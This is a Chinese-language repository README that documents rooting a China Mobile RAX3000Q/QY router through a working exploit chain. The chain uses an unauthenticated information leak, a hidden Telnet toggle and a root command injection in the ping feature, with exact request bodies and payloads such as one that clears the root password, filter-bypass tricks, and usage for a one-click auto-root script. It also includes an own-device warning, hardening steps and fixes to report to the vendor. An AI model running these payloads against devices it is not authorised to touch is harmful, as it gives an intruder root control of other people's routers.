# CMCC RAX3000Q/QY SSH 获取链路（自有设备复现记录）

> **适用范围**：仅限**你本人拥有**或已取得**书面授权**的中国移动 RAX3000Q/QY 路由器。
> 对他人设备执行其中任何步骤，在《网络安全法》《刑法》第 285 条下均可能构成违法。

本文档结构：**§1 影响版本 → §2 一键脚本用法 → §3 技术复盘**。

---

## 目录

- [1. 文档信息与影响版本](#1-文档信息与影响版本)
  - [1.1 文档时间](#11-文档时间)
  - [1.2 已验证环境](#12-已验证环境)
  - [1.3 影响范围](#13-影响范围)
  - [1.4 如何判断一台设备是否受影响](#14-如何判断一台设备是否受影响)
  - [1.5 五个固件缺陷](#15-五个固件缺陷)
- [2. 快速上手：一键脚本](#2-快速上手一键脚本)
  - [2.0 动手前必做](#20-动手前必做)
  - [2.1 三条命令](#21-三条命令)
  - [2.2 参数](#22-参数)
  - [2.3 执行输出](#23-执行输出)
  - [2.4 脚本的边界](#24-脚本的边界)
- [3. 技术复盘](#3-技术复盘)
- [4. 数据脱敏说明](#4-数据脱敏说明)
- [5. 加固清单](#5-加固清单)
- [6. 回滚与救砖](#6-回滚与救砖)
- [7. FAQ](#7-faq)

---

# 1. 文档信息与影响版本

## 1.1 文档时间

| 项目     | 值                                                            |
| -------- | ------------------------------------------------------------- |
| 最后更新 | **2026-10-31**                                                |
| 首次记录 | 2026-10（同批次设备维护过程）                                 |
| 状态     | 链路已完全打通并复现，`admin` Web 等级已提至 1 级且重启后保持 |
| CVE      | 未申请，厂商未公开编号                                        |

## 1.2 已验证环境

| 维度         | 值                                                       |
| ------------ | -------------------------------------------------------- |
| 设备型号     | CMCC RAX3000Q / RAX3000QY（`board_type: RAX3000Q`）      |
| 固件         | OpenWrt Chaos Calmer 定制版                              |
| 内核         | Linux 4.4.60 armv7l                                      |
| 固件构建时间 | 2022-01-06 22:19:36 CST                                  |
| Web 服务     | `mini_httpd/1.30 26Oct2018`                              |
| Web 前端     | `rx3_web`（Vue），入口 `admin/js/app.<hash>.js`          |
| Shell        | BusyBox v1.30.1                                          |
| SSH          | Dropbear v2019.78（**仅编译 RSA** 主机密钥）             |
| 出厂端口     | 22/23/443 关闭，80/8080 开放                             |
| 配置存储     | `/etc/tzcfg/system_config.use`（定长记录，**密码明文**） |

> 厂商没有对外暴露统一版本号字符串，因此本文以**固件构建时间 + 组件版本**作为版本标识。

## 1.3 影响范围

| 范围             | 判定                               | 依据                                                                                                                 |
| ---------------- | ---------------------------------- | -------------------------------------------------------------------------------------------------------------------- |
| **已验证受影响** | 上述 2022-01-06 构建的 RAX3000Q/QY | 全链路实机复现成功                                                                                                   |
| **疑似受影响**   | 同期（2021Q4–2022Q2）CMCC 定制固件 | 共用同一套 `http.cgi` 命令表：`cmd=232` token 挑战、`cmd=234` 服务开关、`cmd=168` ping 注入、`cmd=80` 未授权信息泄露 |
|                  |

## 1.4 如何判断一台设备是否受影响

三条命令，从弱到强：

```bash
# ① Web 服务指纹
curl -sI http://192.168.1.1/ | grep -i server
#   → Server: mini_httpd/1.30 26Oct2018   ← 命中特征

# ② 页面标题
curl -s http://192.168.1.1/ | grep -o '<title>.*</title>'
#   → <title>中国移动</title>

# ③ 最关键：未登录访问 cmd=80，看是否返回账号结构
curl -s -X POST http://192.168.1.1/cgi-bin/http.cgi \
     -H 'Content-Type: application/json' \
     -d '{"cmd":80,"method":"GET","sessionId":""}'
#   → 返回含 account_level / userName1..3 / web_page_hide 的 JSON 即为同族固件
```

③ 命中即说明 `http.cgi` 命令表一致，后续 §3 的方法大概率通用。脚本的 `--check` 可以一次跑完这三项：

```bash
python scripts/auto_root.py 192.168.1.1 --check
```

## 1.5 五个固件缺陷

按危害排序，这是整条链路能成立的根因：

| #   | 缺陷                                                 | 位置                                                   | 后果                    |
| --- | ---------------------------------------------------- | ------------------------------------------------------ | ----------------------- |
| 1   | **命令注入**，`url` 参数未过滤 `$()`，且以 root 执行 | `cmd=168` NETWORK_TOOLS                                | 直接 root 命令执行      |
| 2   | **Web 密码明文存储**                                 | `/etc/tzcfg/system_config.use` 的 `SYS_USER_LOGIN_PWD` | 拿到配置即拿到密码      |
| 3   | **隐藏接口无二次鉴权**，只校验会话不校验等级         | `cmd=234` SYS_SERVICE_SET                              | 普通管理员即可开 Telnet |
| 4   | **Telnet 监听 4719 且默认 root**，一旦开启即完全失陷 | telnetd                                                | 常规端口扫描看不见      |
| 5   | **弱主机密钥**，Dropbear 2019.78 仅 RSA              | dropbear                                               | 客户端必须降级算法      |

---

# 2. 快速上手：一键脚本

`scripts/auto_root.py` 把 §3 的全部阶段串成一条命令：

```text
指纹确认 → Web 登录 → 开 Telnet → root shell
        → 设置 root 密码 → 配置 Dropbear(22) → 验证 SSH → 关 Telnet
```

## 2.0 动手前必做

**这一步比后面所有步骤都重要。** 命令注入 + 改 UCI 配置有变砖、失联风险。

1. **确认恢复手段**：手上有串口（TTL）或 U-Boot 恢复方式吗？没有就别改网络配置。
2. **确认设备归属**：这是你自己的设备，不是房东的、不是公司的、不是邻居的。
3. **选对时机**：不要在远程办公中、只有 WiFi 单路径可达、家里没人能物理接触设备时执行。

## 2.1 三条命令

```bash
export ROUTER_PASS='你的 Web 管理员密码'

# ① 只读体检：端口、等级、固件指纹。不改任何东西
python scripts/auto_root.py 192.168.1.1 --check

# ② 看执行计划，确认无误
python scripts/auto_root.py 192.168.1.1 --confirm-owned --dry-run

# ③ 真正执行
python scripts/auto_root.py 192.168.1.1 --confirm-owned
```

执行完会打印 root 密码和 SSH 连接命令。密码只打印在终端，不写入任何文件。

首次在真机跑，建议按 ① → ② → ③ 顺序，别跳步。

## 2.2 参数

| 参数                 | 说明                                                   |
| -------------------- | ------------------------------------------------------ |
| `host`               | 路由器管理地址（**必须是私有网段**）                   |
| `--user`             | Web 管理员账号，默认 `admin`                           |
| `--web-pass`         | Web 密码；也可用环境变量 `ROUTER_PASS`                 |
| `--root-pass`        | 要设置的 root 密码；缺省自动生成 20 位随机强密码       |
| `--allow-root-reset` | 原 root 密码未知时，允许 `passwd -d root` 清空后再设置 |
| `--http-port`        | Web/CGI 端口，默认 80（部分部署是 8080）               |
| `--telnet-port`      | 隐藏 Telnet 端口，默认 4719                            |
| `--check`            | 只读体检                                               |
| `--dry-run`          | 只打印计划，不执行                                     |
| `--confirm-owned`    | 确认设备归属（执行模式必填）                           |

**依赖**：Python 3.8+，仅标准库，无第三方包（Python 3.13 已移除 `telnetlib`，IAC 协商为内置实现）。

## 2.3 执行输出

```text
[   0.0s] == 阶段 1/7  指纹确认
[   0.0s]      Server: mini_httpd/1.30 26Oct2018
[   0.0s]      account_level=3  userName=superadmin/senior/admin
[   0.0s] [ok] 确认是 RAX3000Q/QY 系固件

[   0.0s] == 阶段 2/7  Web 登录
[   0.0s] [ok] 登录成功  user_level=3

[   0.3s] == 阶段 3/7  开启隐藏 Telnet
[   1.5s] [ok] Telnet 已在 4719 端口监听

[   1.5s] == 阶段 4/7  获取 root shell
[   1.5s] [ok] uid=0(root) gid=0(root) groups=0(root)
[   1.5s]      Linux 4.4.60

[   1.5s] == 阶段 5/7  设置 root 密码
[   1.5s] [ok] root 密码已写入 /etc/shadow

[   1.5s] == 阶段 6/7  配置并启用 Dropbear
[   1.5s]      原配置已备份到 /root/dropbear.bak.<ts>
[   1.5s] [ok] 22/tcp 已监听
[   1.5s] [ok] SSH banner: SSH-2.0-dropbear_2019.78

[   3.6s] == 阶段 7/7  关闭临时 Telnet
[   3.6s] [ok] 4719 端口已关闭

====================================================================
 完成
====================================================================
 root 密码 : <自动生成，见终端>
 SSH 连接  :
   ssh -o HostKeyAlgorithms=+ssh-rsa \
       -o PubkeyAcceptedAlgorithms=+ssh-rsa \
       root@192.168.1.1
====================================================================
```

# 3. 技术复盘

## 3.0 攻击链总览

```text
 ┌──────────────┐   ①  token + sha256 单次登录      ┌──────────────────┐
 │  你的 PC     │ ───────────────────────────────▶ │  Web CGI         │
 │ 192.168.1.100│                                  │ /cgi-bin/http.cgi│
 └──────┬───────┘   ②  cmd=234 telnet=1            │ 以 root 运行     │
        │        ───────────────────────────────▶ │                  │
        │                                          └────────┬─────────┘
        │   ③  cmd=168 url=$(...)  命令注入                  │
        │        ──────────────────────────────────────────▶ │
        │                                                    ▼
        │   ④  telnet 4719  →  root shell  ←── telnetd 被拉起
        ▼
   passwd root → uci dropbear → 22/tcp → 关 Telnet
```

| 阶段 | 关键点                                        | 前置条件            |
| ---- | --------------------------------------------- | ------------------- |
| 认证 | `sha256(token + password)` 挑战应答           | 知道 Web 管理员密码 |
| 提权 | `cmd=234` 打开隐藏 Telnet（4719）             | 已登录 Web          |
| 执行 | `cmd=168` 的 `url` 未过滤 `$()`，以 root 执行 | 已登录 Web          |
| 落地 | Telnet + 空/已知 root 密码                    | Telnet 已开         |
| 持久 | `uci` 改 Dropbear 端口与自启                  | 已有 root shell     |

**最小充分条件是"Web 管理员密码"。** 没有它第一步就过不去。

## 3.1 阶段一：信息收集

从 LAN 侧做 TCP 探测：

```text
22   closed
23   closed
80   open      ← Web 管理界面
443  closed
8080 open      ← mini_httpd 目录列表（根为空）
```

HTTP 响应头：

```http
HTTP/1.1 200 Ok
Content-Type: text/html; charset=UTF-8
Server: mini_httpd/1.30 26Oct2018
Last-Modified: Thu, 06 Jan 2022 14:01:44 GMT
```

从 `admin/js/app.<hash>.js` 中提取到唯一业务入口：

```text
/cgi-bin/http.cgi
```

所有业务请求均为 `POST`，JSON 包体，公共字段：

```json
{
  "cmd": 100,
  "method": "GET 或 POST",
  "sessionId": "<登录后返回的 64 位十六进制>"
}
```

> `method` 同时出现在 JSON 包体里，前端 axios 拦截器强制把 HTTP 方法改为 POST。
> 也就是说 **HTTP 动词永远是 POST**，真正的动作语义由包体内 `method` 决定。

**未登录可读的接口**：`cmd=80`（`INIT_PAGE`）无需 session：

```json
{
  "success": true,
  "cmd": 80,
  "account_level": "3",
  "login_times": "2",
  "userName3": "admin",
  "userName2": "senior",
  "userName1": "superadmin",
  "web_page_hide": "<WEB_PAGE_HIDE>"
}
```

信息量很大：三个账号名、各自等级、剩余登录次数。这本身就是个信息泄露缺陷。

## 3.2 阶段二：认证机制逆向

### 取挑战 token

```json
{ "cmd": 232, "method": "GET", "sessionId": "" }
```

```json
{
  "success": true,
  "cmd": 232,
  "buffer": "3",
  "token": "<TOKEN>",
  "netx_login_time": "267"
}
```

| 字段              | 含义                                     |
| ----------------- | ---------------------------------------- |
| `buffer`          | 剩余登录尝试次数，`0` 表示已锁定         |
| `token`           | 本次挑战串，登录时与密码拼接后做 SHA-256 |
| `netx_login_time` | 锁定剩余秒数（`buffer=0` 时有效）        |

### 构造登录密文

```bash
printf '%s' "${TOKEN}${PASSWORD}" | sha256sum | awk '{print $1}'
```

### 提交登录

```json
{
  "cmd": 100,
  "method": "POST",
  "username": "admin",
  "passwd": "<sha256(token+password)>",
  "isAutoUpgrade": "0",
  "sessionId": ""
}
```

成功：

```json
{
  "success": true,
  "cmd": 100,
  "user_level": "3",
  "AUTH": "AUTH",
  "sessionId": "<SESSION_ID>"
}
```

失败：

```json
{ "success": true, "cmd": 100, "login_times": "1", "login_fail": "fail" }
```

### 三个必踩的坑

1. **`success: true` 不等于登录成功**。它只代表 CGI 调用没报错。必须看 `AUTH` / `sessionId` 是否存在。
2. **`login_times` 是剩余次数，不是失败次数**。看到 `"1"` 意味着你只剩 1 次机会。
3. **密码末尾的特殊字符会被吞**。本次环境里密码以逗号结尾，漏掉逗号导致连续失败 —— 哈希是对**原始字节**做的，一个字符都不能少。

### 锁定机制

```json
{ "buffer": "0", "netx_login_time": "124" }
```

表示还需等待约 124 秒，之后 `buffer` 恢复为 3。

> 这就是"自动爆破"没有意义的原因：每 24 小时约 1440 次尝试。对任何像样的密码，这个速率在数学上等于零，还必然在设备侧留下告警日志。

## 3.3 阶段三：隐藏服务接口

在 `chunk-2d222cbb` 中发现"系统设置"页面，背后是 `cmd=234`（`SYS_SERVICE_SET`）：

读当前状态：

```json
{ "cmd": 234, "method": "GET", "sessionId": "<SESSION_ID>" }
```

```json
{ "success": true, "cmd": 234, "telnet": "", "telnet_orca": "0" }
```

打开 Telnet：

```json
{
  "cmd": 234,
  "method": "POST",
  "telnet": "1",
  "ssh": "1",
  "sessionId": "<SESSION_ID>"
}
```

确认已开：

```json
{ "success": true, "cmd": 234, "telnet": "1", "telnet_orca": "0" }
```

**关键发现：**

- Telnet 监听在 **4719**，**不是 23**（常规端口扫描看不见它）
- `ssh:"1"` 在这个固件上**被完全忽略**，SSH 不会因此开启
- 该固件的 Dropbear 默认配置是 `Port 8357` + `enable 0`（服务根本没起来）
- 页面开关由 `account_level` 与 `web_page_hide` 共同控制，但**后端不做二次鉴权** —— 只要登录了就能调

## 3.4 阶段四：命令注入拿 root

前端 ping 页面调用 `NETWORK_TOOLS`：

```json
{
  "cmd": 168,
  "method": "POST",
  "subcmd": 0,
  "pingTimes": 1,
  "url": "127.0.0.1",
  "sessionId": "<SESSION_ID>"
}
```

后端把 `url` 直接拼进 shell 命令。验证 payload：

```text
$(id)
```

结果写进 `/tmp/tzwww/pingrt`，用 `GET_FILE_DATA` 读出来：

```json
{
  "cmd": 204,
  "method": "GET",
  "url": "/tmp/tzwww/pingrt",
  "subcmd": 168,
  "sessionId": "<SESSION_ID>"
}
```

```text
ping: bad address 'uid=0(root) gid=0(root) groups=0(root)'
```

**命令以 root 身份执行** —— 这就是整条链路的提权点。

### 过滤绕过要点

| 过滤项         | 状态           | 绕过方式         |
| -------------- | -------------- | ---------------- |
| 双引号 `"`     | 被过滤         | 不需要           |
| 反引号 `` ` `` | 被过滤         | 用 `$()`         |
| 空格           | 前端输入框限制 | 用 `${IFS}` 替代 |
| `$()`          | **未过滤**     | 直接可用         |

所以清空 root 密码的 payload 是：

```text
$(passwd${IFS}-d${IFS}root)
```

回显：

```text
passwd: password for root changed by root
```

> 这一步把系统置于**最危险的状态**：root + 空密码 + Telnet 开着。
> 时间窗口应压缩到分钟级 —— 拿到 shell 立刻设密码、立刻关 Telnet。

## 3.5 阶段五：root Shell 落地

```bash
telnet 192.168.1.1 4719
```

```text
OpenWrt login: root
Password:                 ← 直接回车（密码已清空）
```

```text
BusyBox v1.30.1 () built-in shell (ash)
root@OpenWrt:~# id
uid=0(root) gid=0(root) groups=0(root)
```

**第一件事不是探索，是设密码：**

```sh
passwd root
```

```text
Changing password for root
New password:
Retype password:
passwd: password for root changed by root
```

密码规范：16 位以上、与 Web 密码不同、不含空格（部分固件的 `passwd` 对空白处理有 bug）。

顺手备份配置：

```sh
mkdir -p /root/bak
cp /etc/tzcfg/system_config.use /root/bak/system_config.use.orig
cp /etc/tzcfg/system_config.bak /root/bak/system_config.bak.orig
cp /etc/config/dropbear        /root/bak/dropbear.orig
chmod -R 700 /root/bak
```

## 3.6 阶段六：Dropbear 持久化

### 初始状态

```text
/etc/config/dropbear:
  option PasswordAuth     'on'
  option RootPasswordAuth 'on'
  option Port             '8357'
  option enable           '0'
```

```text
$ dropbear -V
Dropbear v2019.78

$ dropbearkey -h
-t type  Type of key to generate. One of:
         rsa
```

**只编译了 RSA** —— 该设备无法生成 ECDSA/Ed25519 主机密钥，客户端必须显式兼容 `ssh-rsa`。

### 改配置并启动

```sh
uci set dropbear.@dropbear[0].Port=22
uci set dropbear.@dropbear[0].enable=1
uci set dropbear.@dropbear[0].PasswordAuth=on
uci set dropbear.@dropbear[0].RootPasswordAuth=on
uci commit dropbear

/etc/init.d/dropbear enable
/etc/init.d/dropbear start
```

### 验证

```sh
ps | grep dropbear | grep -v grep
netstat -ltn | grep ':22'
```

```text
 2353 root  860 S  /usr/sbin/dropbear -F -P /var/run/dropbear.1.pid -p 22
tcp  0  0 0.0.0.0:22  0.0.0.0:*  LISTEN
tcp  0  0 :::22       :::*       LISTEN
```

开机自启链接应出现：

```text
/etc/rc.d/K50dropbear
/etc/rc.d/S19dropbear
```

### 客户端连接

新版 OpenSSH 默认拒绝 `ssh-rsa`：

```text
Unable to negotiate with 192.168.1.1 port 22:
no matching host key type found. Their offer: ssh-rsa
```

用兼容参数：

```bash
ssh -o HostKeyAlgorithms=+ssh-rsa \
    -o PubkeyAcceptedAlgorithms=+ssh-rsa \
    root@192.168.1.1
```

固化到 `~/.ssh/config`：

```text
Host rax3000
  HostName 192.168.1.1
  User root
  HostKeyAlgorithms +ssh-rsa
  PubkeyAcceptedAlgorithms +ssh-rsa
```

之后直接 `ssh rax3000`。验证输出：

```text
uid=0(root) gid=0(root)
Linux OpenWrt 4.4.60 #2 SMP Thu Jan 6 22:19:36 CST 2022 armv7l GNU/Linux
SSH_OK
```

### 关掉临时 Telnet

```json
{
  "cmd": 234,
  "method": "POST",
  "telnet": "0",
  "ssh": "1",
  "sessionId": "<SESSION_ID>"
}
```

确认：

```text
22   open
23   closed
4719 closed
```

## 3.7 阶段七：Web 等级提升（可选）

目标：把 `admin` 从 3 级（普通管理员）提到 1 级（superadmin），让隐藏菜单全部可见。

### 先证伪：等级不是由 `SYS_USER_LOGIN_LEVEL` 决定的

直接改这个字段**没有任何效果**：

```sh
mdlcfg -a SYS_USER_LOGIN_LEVEL=1
mdlcfg -c
mdlcfg -g SYS_USER_LOGIN_LEVEL      # → 1，看起来成功了
```

但重新登录仍返回 `user_level=3`。

### 真实机制：按账号名分支返回

```text
SYS_SUPER_LOGIN_NAME  → user_level = 1
SYS_SENIOR_LOGIN_NAME → user_level = 2
SYS_USER_LOGIN_NAME   → user_level = 3
```

`SYS_USER_LOGIN_LEVEL` 只是**最近一次登录的结果快照**（写日志用的），不是输入。

实测：用 `senior` 登录一次，该字段变成 2；再用 `admin` 登录，变回 1。它就是个状态位。

### 生效路径

登录逻辑**先匹配 `SYS_USER_LOGIN_NAME`**。所以只把 `admin` 塞进 superadmin 分支不够 —— 它会先命中 3 级分支。必须同时把普通分支改名，给 `admin` 腾位置：

```sh
set -e

mkdir -p /root/pre_admin1
cp /etc/tzcfg/system_config.use /root/pre_admin1/system_config.use.orig
cp /etc/tzcfg/system_config.bak /root/pre_admin1/system_config.bak.orig

# 1. 让 admin 命中 superadmin 分支
mdlcfg -a SYS_SUPER_LOGIN_NAME=admin
mdlcfg -a SYS_SUPER_LOGIN_PWD="$ADMIN_PASS"

# 2. 原普通用户分支改名，避免先命中 3 级
mdlcfg -a SYS_USER_LOGIN_NAME=admin_legacy

# 3. 保存
mdlcfg -c
```

重新登录：

```json
{"success": true, "cmd": 100, "user_level": "1", "AUTH": "AUTH"}
{"cmd": 80, "account_level": "1", "userName1": "admin", "userName2": "senior", "userName3": "admin_legacy"}
```

重启后仍保持（配置已落闪存）：

```text
uptime: 219s
super=admin  user=admin_legacy  senior=senior  level=1
22 open   4719 closed
```

> 原 `superadmin` 的密码被覆盖了。改回账号名不会恢复旧密码，需从备份提取。

## 3.8 配置存储格式（补充）

`/etc/tzcfg/system_config.use` 不是文本配置，是**定长记录数组**：

```text
每条记录 128 字节：
  +0   .. +63    值 value（64 字节，\0 填充）
  +64  .. +127   键 key  （64 字节，\0 填充）
```

`mdlcfg` 是官方读写工具：

```sh
mdlcfg -g XXX        # 读
mdlcfg -a XXX=YYY    # 写（内存）
mdlcfg -c            # 存盘
mdlcfg -e            # 导出全部
```

**不要直接改二进制文件。** 另外注意：Web 登录动作会用内存快照重写 `.use` 和 `.bak`，所以在登录状态下手工改文件会被覆盖 —— 必须走 `mdlcfg`。

---

# 4. 数据脱敏说明

本仓库从原始记录中移除了以下内容：

| 敏感项                       | 处理方式                                 | 说明                           |
| ---------------------------- | ---------------------------------------- | ------------------------------ |
| 真实网关 / 客户端内网地址    | 统一改为 `192.168.1.1` / `192.168.1.100` | 原值不保留在仓库任何位置       |
| 登录挑战 token 明文          | `<TOKEN>`                                | 每次会话不同，泄露无害但无意义 |
| `sessionId` 64 位串          | `<SESSION_ID>`                           | 等同于会话凭据                 |
| `web_page_hide` 位图         | `<WEB_PAGE_HIDE>`                        | 设备指纹的一部分               |
| Web 管理员密码               | `<ADMIN_PASS>`                           | **从未入库**，仅经环境变量传递 |
| root 密码                    | 不记录                                   | 由使用者自行设置               |
| 固件前端 hash 文件名         | `app.<hash>.js`                          | 可缩小固件版本范围             |
| MAC / SN / SSID / PPPoE 账号 | 已全部剔除                               | 可用于设备追踪                 |

保留项：`cmd` 编号、字段名、偏移量、payload 语法 —— 这些是固件的**通用**特征，与具体设备无关。

**仓库卫生：**

```gitignore
secrets.env
*.use
*.bak
*.log
```

`secrets.env.example` 只是模板：

```sh
ROUTER_IP=192.168.1.1
ROUTER_USER=admin
ROUTER_PASS=change-me
```

---

# 5. 加固清单

拿下设备后，按此顺序收口：

- [ ] root 密码 ≥ 16 位，与 Web 密码**不同**
- [ ] 关闭临时 Telnet（`cmd=234, telnet=0`），确认 4719 已关
- [ ] `netstat -ltn` 确认 22 只在内网可达
- [ ] 检查 WAN 区域防火墙，不放行 22 / 4719 / 80
- [ ] 不需要时关闭 Web 远程管理
- [ ] 备份配置，并**加密**备份文件（里面是明文密码）
- [ ] 如果固件支持，升级 Dropbear 以使用 Ed25519 主机密钥
- [ ] 记录本次改动，方便日后回滚

**给厂商的反馈要点**（对应 §1.5）：

1. `ping` 的 `url` 参数需参数化或白名单校验，禁止拼接 shell
2. Web 密码应加盐哈希，停止明文存 `SYS_USER_LOGIN_PWD`
3. `cmd=234` 等管理指令需按 `account_level` 做服务端二次鉴权
4. Telnet 默认关闭，且不应绑定 `root` + 空密码
5. Dropbear 升级至支持 Ed25519 的版本

---

# 6. 回滚与救砖

## 软件回滚

```sh
# 恢复账号名
mdlcfg -a SYS_SUPER_LOGIN_NAME=superadmin
mdlcfg -a SYS_USER_LOGIN_NAME=admin
mdlcfg -a SYS_USER_LOGIN_LEVEL=3
mdlcfg -c

# 恢复 Dropbear 原配置
cp /root/bak/dropbear.orig /etc/config/dropbear
/etc/init.d/dropbear restart
```

整份配置恢复：

```sh
cp /root/bak/system_config.use.orig /etc/tzcfg/system_config.use
cp /root/bak/system_config.bak.orig /etc/tzcfg/system_config.bak
reboot
```

## 变砖了怎么办

按顺序尝试：

1. **网线直连 LAN 口**，看是否还有 DHCP / 固定 IP `192.168.1.1` 可达
2. **30-30-30 复位**：通电按住 Reset 30 秒 → 断电仍按住 30 秒 → 通电继续按 30 秒
3. **U-Boot + TFTP**：上电瞬间串口输出里找 `Press any key to interrupt`，进入后 `tftpboot` 刷回原厂固件
4. **TTL 串口**：115200 8N1，看内核日志定位卡在哪一步

> 这也是 §2.0 强调"先确认恢复手段"的原因。没有串口就不要改网络配置。

---

# 7. FAQ

**Q：为什么不用 `ssh` 字段直接开 SSH？**
A：该固件后端只处理 `telnet`，`ssh` 字段被静默忽略。实测多次，`telnet_orca` 才是真正的状态位。

**Q：为什么 `passwd -d root` 之后 Telnet 能空密码登录，SSH 不行？**
A：Dropbear 默认拒绝空密码（`RootPasswordAuth` 之外还有 PAM/shadow 层校验），必须设真实密码。

**Q：为什么改了 `SYS_USER_LOGIN_LEVEL` 没用？**
A：它是登录结果的输出快照，不是输入。真正的分支逻辑按账号名匹配，见 §3.7。

**Q：配置改完重启会回滚吗？**
A：`mdlcfg -c` 之后不会。但 Web 登录动作会用内存快照重写配置文件，所以登录状态下手工改文件会被覆盖 —— 必须用 `mdlcfg`。

**Q：新版固件还能用吗？**
A：未验证。§1.4 的第三条命令（未登录 `cmd=80`）若仍返回账号结构，说明命令表一致，但 ping 注入可能已被过滤，需要用 `$(id)` 单独确认。

---

## 附录：仓库结构

```text
.
├── README.md                        # 本文
├── SECURITY.md                      # 授权范围、凭据规范、加固建议
├── docs/
│   ├── 01-recon.md                  # 端口、Web UI、固件识别
│   ├── 02-login-api.md              # /cgi-bin/http.cgi 登录流程
│   ├── 03-rce-and-telnet.md         # SYS_SERVICE_SET 与 ping 命令注入
│   ├── 04-enable-ssh.md             # Dropbear 配置与验证
│   ├── 05-admin-level-attempt.md    # admin 等级改 1（已成功）
│   └── 06-api-reference.md          # 用到的 cmd 速查
├── scripts/
│   ├── auto_root.py                 # ★ 一键：IP + 密码 → root + SSH
│   ├── router_api.py                # 分步调试用：login / rce / telnet 单动作
│   ├── configure_dropbear.sh        # 路由器端：配置并启动 Dropbear
│   ├── set_admin_level1.sh          # 路由器端：admin 提到 1 级
│   └── verify_ssh.sh                # 客户端：SSH 兼容性验证
├── artifacts/
│   ├── system_config_format.md      # /etc/tzcfg/system_config.use 记录格式
│   └── sanitized-output.txt         # 脱敏后的关键输出
├── secrets.env.example
└── .gitignore
```

---

## 免责声明

本项目仅记录对**自有设备**的维护过程。命令注入、修改固件配置存在变砖、失联、数据丢失风险，请在操作前备份配置并确保有串口/恢复手段。

文中涉及的固件缺陷属于中国移动定制固件的历史问题，建议通过运营商渠道反馈，而非在公网传播利用方式。
